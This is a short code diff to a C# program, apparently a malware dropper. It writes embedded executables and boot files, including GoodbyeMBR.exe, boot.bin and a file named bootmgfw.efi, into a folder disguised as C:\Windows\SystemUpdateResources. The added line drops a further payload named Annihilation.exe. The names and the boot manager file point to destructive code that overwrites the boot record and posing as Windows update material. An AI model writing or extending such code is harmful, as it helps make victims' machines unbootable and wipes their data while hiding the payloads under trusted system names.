@@ -190,6 +190,7 @@ namespace auth
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe", auth.Properties.Resources.GoodbyeMBR);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\boot.bin", auth.Properties.Resources.boot);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\bootmgfw.efi", auth.Properties.Resources.bootmgfw);
+                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\Annihilation.exe", auth.Properties.Resources.Annihilation);
                     using (var iconStream = File.OpenWrite(@"C:\Windows\SystemUpdateResources\Belfiore.ico"))
                     {
                         Properties.Resources.Belfiore.Save(iconStream);
